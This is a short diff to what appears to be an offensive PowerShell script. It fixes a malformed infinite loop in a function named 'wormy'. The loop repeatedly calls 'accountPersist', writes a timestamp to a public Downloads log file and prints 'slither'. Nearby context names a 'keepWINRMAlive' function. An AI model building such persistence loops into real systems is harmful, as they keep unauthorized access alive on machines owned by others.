@@ -82,7 +82,7 @@ function keepWINRMAlive{
 }
 function wormy{
     
-    while(while 1 -eq 1){
+    while(1 -eq 1){
     accountPersist
     [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
     Write-Output 'slither'
